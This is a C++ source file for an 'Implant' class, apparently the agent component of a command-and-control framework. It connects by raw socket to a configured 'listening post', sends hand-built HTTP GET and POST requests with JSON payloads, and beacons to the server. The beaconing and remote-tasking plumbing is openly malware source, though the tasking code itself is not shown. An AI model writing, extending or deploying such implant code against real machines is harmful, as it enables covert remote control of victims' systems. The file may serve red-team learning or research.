#include "implant.h"
#include "tasks.h"

#include <sstream>
#include <fstream>

#include <unistd.h>

using json = nlohmann::json;

// Function to send an asynchronous HTTP request with a payload to the listening post
std::string Implant::sendHttpRequest(std::string_view path, 
    HttpMethod method, 
    const json& payload) 
{
    std::stringstream ss;
    std::string request_string;
    std::string str_payload;

/*
    <Request-Line>
    <Headers>
    <Blank Line>
    [<Request Body>]
*/
    switch (method) {
        case HttpMethod::GET:
            ss << "GET " << path << " HTTP/1.1\r\n" << "Host: " << host << "\r\n" << "\r\n";
            request_string = ss.str();
            std::cout << request_string << std::endl;
            break;
        case HttpMethod::POST:
            std::cout << "payload size: " << str_payload.size() << std::endl;
            std::cout << "payload length: " << str_payload.length() << std::endl; 
            str_payload = payload.dump();
            ss << "POST " << path << " HTTP/1.1\r\n" << "Host: " << host << "\r\n" << "Content-Type: application/json\r\n"
               << "Content-Length: " << str_payload.length() << "\r\n"
               << "\r\n"
               << str_payload;
            request_string = ss.str();
            break;
        default:
            throw std::runtime_error("Invalid HTTP method");
    }

    int req = send(socket_fd, request_string.c_str(), request_string.length(), 0);
    if (req < 0) {
        fprintf(stderr, "failed to send request: %s\n", gai_strerror(status));
        exit(EXIT_FAILURE);
    }

     // Receive the response from the server
    char buffer[4096]; // Adjust the buffer size as needed
    std::string response;

    while (true) {
        int bytesReceived = recv(socket_fd, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0) {
            response.append(buffer, bytesReceived);
        } else if (bytesReceived == 0) {
            // Connection closed by the remote side
            break;
        } else {
            // Error in receiving
            fprintf(stderr, "failed to receive response: %s\n", strerror(errno));
            close(socket_fd); // Close the socket in case of an error
            exit(EXIT_FAILURE);
        }
    }

    std::cout << response << std::endl;

    return response;
}

Implant::Implant(std::string server_host, std::string server_port, std::string agent_id, bool isRunning):
    host{ std::move(server_host) },
    port{ std::move(server_port) }, 
    id{ std::move(agent_id) },
    isRunning{ std::move(isRunning) }
{
    // init hints addr_info struct with network info (internet fam, sock type)
    //memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    // Convert server_host and server_port because C stuff
    const char* host_cstr = host.c_str();
    const char* port_cstr = port.c_str();

    status = getaddrinfo(host_cstr, port_cstr, &hints, &result);
    if (status < 0) {
        fprintf(stderr, "getaddrinfo error: %s\n", gai_strerror(status));
        exit(EXIT_FAILURE); 
    }

    socket_fd = socket(result->ai_family, result->ai_socktype, 0);
    if (socket_fd < 0) {
        fprintf(stderr, "socket init failed: %s\n", gai_strerror(status));
        exit(EXIT_FAILURE);
    }

    int connection = connect(socket_fd, result->ai_addr, result->ai_addrlen);

    if (connection < 0) {
        fprintf(stderr, "connection failure: %s\n", gai_strerror(status));
        exit(EXIT_FAILURE); 
    } else {
        std::cout << "Connection Established!" << std::endl;
    }
}

Implant::~Implant() {
    // Close the socket when the object is destroyed
    if (socket_fd != -1) {
        close(socket_fd);
    }
}

void Implant::beacon() {
    if (isRunning) {
        // std::string path = "/agents/" + id;
        std::string path = "/";
        std::string get_response = sendHttpRequest(path, HttpMethod::GET, "");
    }
}

void Implant::setRunning(bool running) { isRunning = running; }
void Implant::setId(std::string& new_agent_id) { id = new_agent_id; }